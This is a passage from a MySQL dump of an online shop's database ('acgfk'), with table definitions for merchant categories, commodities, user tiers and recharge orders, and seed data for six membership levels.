  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `username` (`username`) USING BTREE,
  UNIQUE KEY `email` (`email`) USING BTREE,
  UNIQUE KEY `phone` (`phone`) USING BTREE,
  KEY `pid` (`pid`) USING BTREE,
  KEY `business_level` (`business_level`) USING BTREE,
  KEY `coin` (`coin`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=1000 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_user`
--

LOCK TABLES `acg_user` WRITE;
/*!40000 ALTER TABLE `acg_user` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_user_category`
--

DROP TABLE IF EXISTS `acg_user_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_user_category` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` int unsigned NOT NULL COMMENT '商家id',
  `category_id` int unsigned NOT NULL COMMENT '分类id',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '自定义分类名称',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=屏蔽，1=显示',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `user_id` (`user_id`,`category_id`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  KEY `acg_user_category_ibfk_2` (`category_id`) USING BTREE,
  KEY `user_id_2` (`user_id`) USING BTREE,
  CONSTRAINT `acg_user_category_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `acg_user` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `acg_user_category_ibfk_2` FOREIGN KEY (`category_id`) REFERENCES `acg_category` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_user_category`
--

LOCK TABLES `acg_user_category` WRITE;
/*!40000 ALTER TABLE `acg_user_category` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_user_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_user_commodity`
--

DROP TABLE IF EXISTS `acg_user_commodity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_user_commodity` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` int unsigned NOT NULL COMMENT '商家id',
  `commodity_id` int unsigned NOT NULL COMMENT '商品id',
  `premium` float(10,2) unsigned DEFAULT '0.00' COMMENT '商品加价',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '自定义名称',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=隐藏，1=显示',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `user_id` (`user_id`,`commodity_id`) USING BTREE,
  KEY `commodity_id` (`commodity_id`) USING BTREE,
  KEY `user_id_2` (`user_id`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  CONSTRAINT `acg_user_commodity_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `acg_user` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `acg_user_commodity_ibfk_2` FOREIGN KEY (`commodity_id`) REFERENCES `acg_commodity` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_user_commodity`
--

LOCK TABLES `acg_user_commodity` WRITE;
/*!40000 ALTER TABLE `acg_user_commodity` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_user_commodity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_user_group`
--

DROP TABLE IF EXISTS `acg_user_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_user_group` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '等级名称',
  `icon` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '等级图标',
  `discount` decimal(4,2) unsigned NOT NULL COMMENT '折扣百分比',
  `cost` decimal(4,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '抽成比例',
  `recharge` decimal(14,2) unsigned NOT NULL COMMENT '累计充值(达到该等级)',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `recharge` (`recharge`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_user_group`
--

LOCK TABLES `acg_user_group` WRITE;
/*!40000 ALTER TABLE `acg_user_group` DISABLE KEYS */;
INSERT INTO `acg_user_group` VALUES (1,'一贫如洗','/assets/static/images/group/ic_user level_1.png',0.00,0.30,0.00),(2,'小康之家','/assets/static/images/group/ic_user level_2.png',0.10,0.25,50.00),(3,'腰缠万贯','/assets/static/images/group/ic_user level_3.png',0.20,0.20,100.00),(4,'富甲一方','/assets/static/images/group/ic_user level_4.png',0.30,0.15,200.00),(5,'富可敌国','/assets/static/images/group/ic_user level_5.png',0.40,0.10,300.00),(6,'至尊','/assets/static/images/group/ic_user level_6.png',0.50,0.05,500.00);
/*!40000 ALTER TABLE `acg_user_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_user_recharge`
--

DROP TABLE IF EXISTS `acg_user_recharge`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_user_recharge` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `trade_no` char(22) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '订单号',
  `user_id` int unsigned NOT NULL COMMENT '用户id',
  `amount` decimal(10,2) unsigned NOT NULL COMMENT '充值金额',
  `pay_id` int unsigned NOT NULL COMMENT '支付id',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=未支付，1=已支付',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `create_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '下单IP',
  `pay_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '支付地址',
  `pay_time` datetime DEFAULT NULL COMMENT '支付时间',
  `option` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '配置参数',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `trade_no` (`trade_no`) USING BTREE,
  KEY `user_id` (`user_id`) USING BTREE,
  KEY `pay_id` (`pay_id`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  CONSTRAINT `acg_user_recharge_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `acg_user` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_user_recharge`
--

LOCK TABLES `acg_user_recharge` WRITE;
/*!40000 ALTER TABLE `acg_user_recharge` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_user_recharge` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping routines for database 'acgfk'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-06-25  4:00:04
